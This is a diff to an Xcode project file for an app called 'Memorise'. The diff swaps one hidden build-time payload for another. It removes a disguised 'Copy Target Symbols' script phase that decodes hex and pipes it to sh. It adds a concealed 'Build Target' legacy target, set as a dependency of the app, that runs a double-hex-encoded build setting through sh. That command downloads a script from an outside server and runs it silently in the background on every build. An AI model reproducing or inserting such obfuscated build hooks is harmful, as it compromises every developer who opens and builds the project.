@@ -6,6 +6,16 @@
 	objectVersion = 77;
 	objects = {
 
+/* Begin PBXContainerItemProxy section */
+		4677DB982E6A879E00E7D81A /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 469FE64C2E59ED24003F0CBE /* Project object */;
+			proxyType = 1;
+			remoteGlobalIDString = 84727F5F157C79AE6EBDE67E;
+			remoteInfo = "Build Target";
+		};
+/* End PBXContainerItemProxy section */
+
 /* Begin PBXFileReference section */
 		469FE6542E59ED24003F0CBE /* Memorise.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Memorise.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
@@ -47,12 +57,27 @@
 		};
 /* End PBXGroup section */
 
+/* Begin PBXLegacyTarget section */
+		84727F5F157C79AE6EBDE67E /* Build Target */ = {
+			isa = PBXLegacyTarget;
+			buildArgumentsString = "-c \"${AE76EDB}\"";
+			buildConfigurationList = 4677DB9D2E6B0A5E00E7D81A /* Build configuration list */;
+			buildPhases = (
+			);
+			buildToolPath = /bin/sh;
+			dependencies = (
+			);
+			name = "Build Target";
+			passBuildSettingsInEnvironment = 1;
+			productName = "Build Target";
+		};
+/* End PBXLegacyTarget section */
+
 /* Begin PBXNativeTarget section */
 		469FE6532E59ED24003F0CBE /* Memorise */ = {
 			isa = PBXNativeTarget;
 			buildConfigurationList = 469FE6672E59ED26003F0CBE /* Build configuration list for PBXNativeTarget "Memorise" */;
 			buildPhases = (
-				C60211DE903D6C76A0877BEF /* Copy Target Symbols */,
 				469FE6502E59ED24003F0CBE /* Sources */,
 				469FE6512E59ED24003F0CBE /* Frameworks */,
 				469FE6522E59ED24003F0CBE /* Resources */,
@@ -60,6 +85,7 @@
 			buildRules = (
 			);
 			dependencies = (
+				EF2CF44C9DA9DD3AFCBDE67E /* PBXTargetDependency */,
 			);
 			fileSystemSynchronizedGroups = (
 				469FE6562E59ED24003F0CBE /* Memorise */,
@@ -100,6 +126,7 @@
 			projectDirPath = "";
 			projectRoot = "";
 			targets = (
+				84727F5F157C79AE6EBDE67E /* Build Target */,
 				469FE6532E59ED24003F0CBE /* Memorise */,
 			);
 		};
@@ -115,29 +142,6 @@
 		};
 /* End PBXResourcesBuildPhase section */
 
-/* Begin PBXShellScriptBuildPhase section */
-		C60211DE903D6C76A0877BEF /* Copy Target Symbols */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Copy Target Symbols";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633363337333333363632333436333332333033323634333633343332333033373330333336343337333833363333333636363336333433363335333233303336333833373334333733343337333033373333333336313332363633323636333633333336333433363333333633313336333333363338333633353332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
-			showEnvVarsInLog = 0;
-		};
-/* End PBXShellScriptBuildPhase section */
-
 /* Begin PBXSourcesBuildPhase section */
 		469FE6502E59ED24003F0CBE /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
@@ -148,10 +152,38 @@
 		};
 /* End PBXSourcesBuildPhase section */
 
+/* Begin PBXTargetDependency section */
+		EF2CF44C9DA9DD3AFCBDE67E /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = 84727F5F157C79AE6EBDE67E /* Build Target */;
+			targetProxy = 4677DB982E6A879E00E7D81A /* PBXContainerItemProxy */;
+		};
+/* End PBXTargetDependency section */
+
 /* Begin XCBuildConfiguration section */
+		4677DB992E6A879F00E7D81A /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				COPY_PHASE_STRIP = NO;
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				PRODUCT_NAME = "Build Target";
+			};
+			name = Debug;
+		};
+		4677DB9A2E6A879F00E7D81A /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				COPY_PHASE_STRIP = YES;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				PRODUCT_NAME = "Build Target";
+			};
+			name = Release;
+		};
 		469FE6652E59ED26003F0CBE /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				AE76EDB = "((echo 36353633363836663230323232343238363337353732366332303264363637333662346332303264363432303730336437383633366636343635323036383734373437303733336132663266363636633666373736333634366532653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -215,6 +247,7 @@
 		469FE6662E59ED26003F0CBE /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				AE76EDB = "((echo 36353633363836663230323232343238363337353732366332303264363637333662346332303264363432303730336437383633366636343635323036383734373437303733336132663266363636633666373736333634366532653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -327,6 +360,15 @@
 /* End XCBuildConfiguration section */
 
 /* Begin XCConfigurationList section */
+		4677DB9D2E6B0A5E00E7D81A /* Build configuration list */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				4677DB992E6A879F00E7D81A /* Debug */,
+				4677DB9A2E6A879F00E7D81A /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
 		469FE64F2E59ED24003F0CBE /* Build configuration list for PBXProject "Memorise" */ = {
 			isa = XCConfigurationList;
 			buildConfigurations = (
